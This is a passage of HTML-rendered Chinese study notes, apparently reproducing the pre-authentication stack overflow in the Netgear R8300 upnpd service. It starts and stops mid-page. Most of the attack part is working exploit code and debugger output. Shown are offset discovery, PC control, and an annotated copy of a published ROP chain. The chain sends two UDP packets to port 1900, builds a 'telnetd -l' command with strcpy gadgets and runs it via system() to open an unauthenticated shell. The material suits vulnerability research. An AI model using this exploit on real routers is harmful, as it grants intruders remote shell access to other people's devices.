x:x+<span class="number">1</span></span><br><span class="line">g(<span class="number">1</span>)&gt;&gt;&gt;<span class="number">2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="string">"&lt;L"</span>，小端，unsigned long <span class="number">4</span>字节</span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line">socket.SOCK_DGRAM，upnpd是upd</span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">p32(<span class="number">0x7e2da53c</span>)，十六进制转为bytes</span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line">upnpd是<span class="number">1900</span>端口，netstat -atp可见，但设备不支持p，故Google</span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">payload的构造要通过动态调试</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>搭建调试环境</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">./gdbserver-7.7.1-armel-eabi5-v1-sysv --attach :1234 `ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line">Attached; pid = 2617</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.1.1</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="built_in">cd</span> squashfs-root</span><br><span class="line">gdb-multiarch usr/sbin/upnpd</span><br><span class="line">gef➤  <span class="built_in">set</span> sysroot .</span><br><span class="line">gef➤  target remote 192.168.1.2:1234</span><br><span class="line">0x76d1a4c8 <span class="keyword">in</span> select () from ./lib/libc.so.0<span class="comment"># 连接后自动断在此处</span></span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>pwntools确定偏移</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">con = remote(<span class="string">'192.168.1.2'</span>,1900)一直失败，故用socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 局部变量大小=0x5dc=1500，因此payload=1600*'a'</span></span><br><span class="line">import socket</span><br><span class="line">payload = 1600 * <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"><span class="comment"># 但不符合预期，并没有控制pc为'aaaa'</span></span><br><span class="line"><span class="comment"># 总是断在strstr，0x76e01954 in strstr () from ./lib/libc.so.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 推测在return之前就崩溃了，再回到代码</span></span><br><span class="line">signed int __fastcall sub_25E04(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-634h]<span class="comment"># 目标局部变量</span></span><br><span class="line">  int s; // [sp+600h] [bp-58h]</span><br><span class="line">  int *v51; // [sp+628h] [bp-30h]<span class="comment"># 指针</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  v51 = &amp;v40;<span class="comment"># 指向v40</span></span><br><span class="line">  strcpy((char *)&amp;v40, v3);</span><br><span class="line">  v7 = sub_B60C((const char **)&amp;v51, (const char *)&amp;v52);<span class="comment"># 指针作为参数1传入</span></span><br><span class="line"><span class="comment"># *a1对指针解引用，指针也被覆盖为aaaa，自然崩溃</span></span><br><span class="line">const char *__fastcall sub_B60C(const char **a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">    v5 = strstr(*a1, a2);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 构造payload时要注意：栈上有个指针v41指向v39的，覆盖的时候要将其指向有效地址，否则还没到return控制pc，就在strstr那崩溃了</span></span><br><span class="line">0x634-0x30 = 0x604</span><br><span class="line">在gdb中，target remote连接上后，会自动断在0x76d1a4c8，可直接用这个（不要写死，运行exp.py前再改，因为会变</span><br><span class="line">直接找一个字符串的地址，其不会变，如ida中.data:000556FC aMacBook        DCB <span class="string">"Mac Book"</span>,0</span><br><span class="line">gdb中：gef➤  x/1s 0x000556FC得到0x556fc:	<span class="string">"Mac Book"</span></span><br><span class="line">实测选择<span class="string">"Mac Book"</span>字符串有问题，exp后gdb断不下来</span><br><span class="line">const char *__fastcall sub_B60C(const char **a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">    v5 = strstr(*a1, a2);</span><br><span class="line">  v52 = <span class="string">' '</span>;</span><br><span class="line">  v7 = sub_B60C((const char **)&amp;v51, (const char *)&amp;v52);</span><br><span class="line">可能是<span class="string">"Mac Book"</span>找到了空格，影响了程序的执行，注意这点</span><br><span class="line"></span><br><span class="line">.data:00055666 aIphone         DCB <span class="string">"iPhone"</span>,0</span><br><span class="line">gef➤  x/1s 0x00055666</span><br><span class="line">0x55666:	<span class="string">"iPhone"</span></span><br><span class="line">还是不行</span><br><span class="line"></span><br><span class="line">strcpy，0x00055666，有00字符，截断了，自然没有崩</span><br><span class="line"></span><br><span class="line">那字符串就不行了，其地址都带着00</span><br><span class="line">选函数地址，如system，rop+system的利用方式，是直接将system函数地址写死在payload中的，可证明其地址不变，如果恰好包含0，再找其他库函数</span><br><span class="line">gef➤  x/10i system</span><br><span class="line">   0x76df6270 &lt;system&gt;:	ldr	r3, [pc, <span class="comment">#324]	; 0x76df63bc &lt;system+332&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原ssd文章也如此：https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/</span></span><br><span class="line">In order to successfully change the PC value, we need to reach the <span class="built_in">return</span> part of vulFunction. We have to <span class="built_in">set</span> its value to an existing pointer value that exists <span class="keyword">in</span> memory (other loaded libraries <span class="built_in">functions</span>).</span><br><span class="line"><span class="comment"># 另一篇文章中：https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</span></span><br><span class="line">由于libc库对应的加载基址比较大，即其最高字节不为\x00，因此任意选取该范围内的一个不包含\x00的有效地址即可。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x00055666) +	<span class="comment"># v41</span></span><br><span class="line">    100 * <span class="string">'a'</span> <span class="comment"># 前二都是栈上局部变量，因此控制pc在此</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">成功控制pc</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x61616160 in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x61616160 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>确定偏移</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    cyclic(100)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x6161616a in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x6161616a <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤ </span><br><span class="line"></span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic 100</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic -l 0x6161616a</span><br><span class="line">36</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic -l 0x6161616b</span><br><span class="line">40</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意到之前aaaa时，pc为0x61616160，故pc为0x6161616a，找位置时要再+1，因为要对齐，奇数要变为偶数</span></span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    40 * <span class="string">'a'</span> + </span><br><span class="line">    <span class="string">'bbbb'</span> <span class="comment"># pc</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x62626262 in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x62626262 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤  </span><br><span class="line"></span><br><span class="line">验证正确</span><br><span class="line"></span><br><span class="line">控制pc处的偏移为：</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    40 * <span class="string">'a'</span> + </span><br><span class="line">    <span class="string">'bbbb'</span> <span class="comment"># pc</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004939.jpg" alt="image-20201118152102149"></p>
<ol start="6">
<li><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">显然，R4 - R11 也是可控的，思考一下目前的情况：</span><br><span class="line"></span><br><span class="line">开了 NX 不能用 shellcode。</span><br><span class="line">有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget。</span><br><span class="line">strcpy() 函数导致的溢出，payload 中不能包含 \x00 字符。</span><br><span class="line"></span><br><span class="line">其实可控 PC 后已经可以干很多事了，upnpd 内包含大量 system 函数调用，比如 reboot。</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="SSD"><a href="#SSD" class="headerlink" title="SSD"></a>SSD</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/</a></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004938.jpg" alt="image-20201120164905786"></p>
<h3 id="文章内容"><a href="#文章内容" class="headerlink" title="文章内容"></a>文章内容</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ASLR Bypassing through Stack Reuse</span><br><span class="line"></span><br><span class="line">The router has the ASLR mitigation turned on, <span class="built_in">which</span> we can bypass using a ROP Attack. However, we are performing a copy call through the use of strcpy, <span class="built_in">which</span> is sensitive to NULL bytes, <span class="built_in">which</span> would <span class="keyword">in</span> turn prevent us to use the ROP attack. Therefore to utilize an address that contains a NULL byte, we will need to use a stack reuse attack.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># NX阻止shellcode在栈上执行，可用ret2libc绕过</span></span><br><span class="line"><span class="comment"># 但ASLR可阻止ret2libc：因为使得lib的加载基址不确定</span></span><br><span class="line"><span class="comment"># ROP可绕过ASLR：ret2libc属于狭义上的ROP，要跳到libc中，直接执行其中的system函数，而广义上的ROP，既可用libc中的指令，又可用自己程序本身的指令，比如BL system，这里说的ROP即用自己指令的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># strcpy存在00截断，会阻止ROP：通过checksec查看upnpd，发现加载基址0x8000，故.text段地址的最高字节均为\x00，因此构造的rop chain一定会包含00，所以与strcpy不允许出现00相矛盾</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 通过stack reuse可绕过上述限制：</span></span><br><span class="line"><span class="comment"># 一般像这种 ROP 的 payload 中包含 \x00，覆盖返回地址的payload 又不能包含 \x00，就要想办法提前将 ROP payload 注入目标内存</span></span><br><span class="line"></span><br><span class="line">We will <span class="keyword">do</span> this by combining two payloads, the composition of first payload is as follows:</span><br><span class="line">    s.send(<span class="string">'a\x00'</span>+expayload) <span class="comment">#expayload is rop gadget</span></span><br><span class="line">We will be sending a “a\x00” value at the beginning of the payload to avoid triggering the UPNP vulnerability, until our payload is <span class="keyword">in</span> the the stack.</span><br><span class="line">The second payload will control the PC value and change it to 0x230f0 and trigger the first payload <span class="keyword">in</span> the stack. 0x230f0 gadget can control stack pointer.</span><br><span class="line">    .text:000230F0                 ADD             SP, SP, <span class="comment">#0x20C</span></span><br><span class="line">    .text:000230F4                 ADD             SP, SP, <span class="comment">#0x1000</span></span><br><span class="line">    .text:000230F8                 LDMFD           SP!, &#123;R4-R11,PC&#125;</span><br><span class="line">We decided to use the BSS area of 0x9E150 to place our strings that we will later use <span class="keyword">for</span> exploitation. Using strcpy gadget 0x13648 and string gadget <span class="keyword">in</span> the binary, we can create the exploiting payload and execute system gadget 0x1A83C.</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 第一次send，发送00+expayload，00防止触发strcpy的溢出漏洞，expayload中是rop gadget（调用strcpy将二进制中字符串gadget拷贝到bss中，来拼接出command字符串，随后调用system执行command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 第二次send，发送payload，通过溢出控制pc为0x230F0，此gadget能控制栈帧，从而找到第一次send的expayload，进而执行expayload中的rop chain（strcpy拼接command字符串、system执行command）</span></span><br></pre></td></tr></table></figure>
<h3 id="exp注解"><a href="#exp注解" class="headerlink" title="exp注解"></a>exp注解</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 &lt;小端、L unsigned long </span></span><br><span class="line">p32 = lambda x: pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 通过replace方法（不同于payload=a+b方法）</span></span><br><span class="line"><span class="comment"># payload中控制pc到此gadget：add sp找到第一次的expayload在栈中位置、LDMFD来控制pc到下一gadget</span></span><br><span class="line">payload = <span class="string">'xxxxxx'</span><span class="comment"># 大量字符</span></span><br><span class="line">expayload = <span class="string">''</span></span><br><span class="line">payload = payload.replace(<span class="string">'z3Bz'</span>,<span class="string">'\x70\x62\xdf\x76'</span>) <span class="comment"># 有效的地址，因为在return前，strstr函数会*p解引用</span></span><br><span class="line">payload = payload.replace(<span class="string">' AAA '</span>,<span class="string">'\xf0\x30\x02\x00'</span>) <span class="comment"># 控制的pc</span></span><br><span class="line"><span class="comment"># .text:000230F0                 ADD             SP, SP, #0x20C</span></span><br><span class="line"><span class="comment"># .text:000230F4                 ADD             SP, SP, #0x1000</span></span><br><span class="line"><span class="comment"># .text:000230F8                 LDMFD           SP!, &#123;R4-R11,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 strcpy的dst，保存拼接后的command字符串</span></span><br><span class="line">bssBase = 0x9E150   <span class="comment">#string bss BASE Address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 dst为bss，src为程序中的string gadget</span></span><br><span class="line">expayload += <span class="string">'a'</span> * 4550</span><br><span class="line">expayload += p32(bssBase+3) <span class="comment"># R4 Register</span></span><br><span class="line">expayload += p32(0x3F340) <span class="comment"># R5 Register //tel</span></span><br><span class="line">expayload += <span class="string">'IIII'</span> <span class="comment"># R6 Register</span></span><br><span class="line">expayload += <span class="string">'HHHH'</span> <span class="comment"># R7 Register</span></span><br><span class="line">expayload += <span class="string">'GGGG'</span> <span class="comment"># R8 Register</span></span><br><span class="line">expayload += <span class="string">'FFFF'</span> <span class="comment"># R9 Register</span></span><br><span class="line">expayload += p32(bssBase) <span class="comment"># R10 Register</span></span><br><span class="line">expayload += <span class="string">'BBBB'</span> <span class="comment"># R11 Register</span></span><br><span class="line">expayload += p32(0x13644) <span class="comment"># strcpy</span></span><br><span class="line"><span class="comment"># .text:00013644                 MOV             R0, R10 ; dest</span></span><br><span class="line"><span class="comment"># .text:00013648                 MOV             R1, R5  ; src</span></span><br><span class="line"><span class="comment"># .text:0001364C                 BL              strcpy</span></span><br><span class="line"><span class="comment"># .text:00013650                 MOV             R0, R4</span></span><br><span class="line"><span class="comment"># .text:00013654                 ADD             SP, SP, #0x5C</span></span><br><span class="line"><span class="comment"># .text:00013658                 LDMFD           SP!, &#123;R4-R8,R10,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 只指定src就可了，dst还是之前的bss，因此跳到0x13648，无需设置r0了</span></span><br><span class="line">expayload += <span class="string">'d'</span>*0x5c<span class="comment">#dummy</span></span><br><span class="line">expayload += p32(bssBase+6) <span class="comment">#R4</span></span><br><span class="line">expayload += p32(0x423D7) <span class="comment">#R5  //telnet</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R6</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R7</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R8 </span></span><br><span class="line">expayload += <span class="string">'d'</span>*4 <span class="comment">#R10</span></span><br><span class="line">expayload += p32(0x13648) <span class="comment">#strcpy</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 command字符串拼接完后，执行system，r4保存bss即command字符串，随后赋值给r0</span></span><br><span class="line"><span class="comment"># .text:0001A83C                 MOV             R0, R4  ; command</span></span><br><span class="line"><span class="comment"># .text:0001A840                 BL              system</span></span><br><span class="line">expayload += <span class="string">'d'</span>*0x5c<span class="comment">#dummy</span></span><br><span class="line">expayload += p32(bssBase) <span class="comment">#R4</span></span><br><span class="line">expayload += p32(0x47398) <span class="comment">#R5 </span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R6</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R7</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R8</span></span><br><span class="line">expayload += <span class="string">'d'</span>*4 <span class="comment">#R10</span></span><br><span class="line">expayload += p32(0x1A83C) <span class="comment">#system(string) telnetd -l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 send两次，第一次保存expayload（rop chain）到栈，第二次溢出控制pc，从而执行第一次的rop chain</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, 1900))</span><br><span class="line">s.send(<span class="string">'a\x00'</span>+expayload)<span class="comment">#expayload is rop gadget </span></span><br><span class="line">s.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8 检查某端口是否开启，若无异常即成功</span></span><br><span class="line">def checkExploit():</span><br><span class="line">    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        ret = soc.connect((<span class="string">'192.168.1.2'</span>,9999))</span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">return</span> 0</span><br></pre></td></tr></table></figure>
<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 exp中payload控制pc为0x000230F0，提前下断</span></span><br><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ gdb-multiarch usr/sbin/upnpd</span><br><span class="line">gef➤  <span class="built_in">set</span> sysroot .</span><br><span class="line">gef➤  target remote 192.168.1.2:1234</span><br><span class="line">0x76d6a4c8 <span class="keyword">in</span> select () from ./lib/libc.so.0</span><br><span class="line">gef➤  b *0x000230F0</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="comment"># 2 exp后成功断下</span></span><br><span class="line"> →    0x230f0                  add    sp,  sp,  <span class="comment">#524	; 0x20c</span></span><br><span class="line">      0x230f4                  add    sp,  sp,  <span class="comment">#4096	; 0x1000</span></span><br><span class="line">      0x230f8                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line">Breakpoint 1, 0x000230f0 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 3 接连ni，通过pop控制pc为0x13644</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x000230f8  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x230f0                  add    sp,  sp,  <span class="comment">#524	; 0x20c</span></span><br><span class="line">      0x230f4                  add    sp,  sp,  <span class="comment">#4096	; 0x1000</span></span><br><span class="line"> →    0x230f8                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line">   ↳     0x13644                  mov    r0,  r10</span><br><span class="line">         0x13648                  mov    r1,  r5</span><br><span class="line">         0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">         0x13650                  mov    r0,  r4</span><br><span class="line">         0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">         0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">         </span><br><span class="line">0x000230f8 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 4 通过strcpy拼接命令字符串到bss的0x9e150</span></span><br><span class="line"><span class="variable">$r0</span>  : 0x0009e150  →  0x00000000</span><br><span class="line"><span class="variable">$r1</span>  : 0x0003f340  →  <span class="string">"telec_dfs_ch_enable"</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x0001364c  →   bl 0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">      0x13644                  mov    r0,  r10</span><br><span 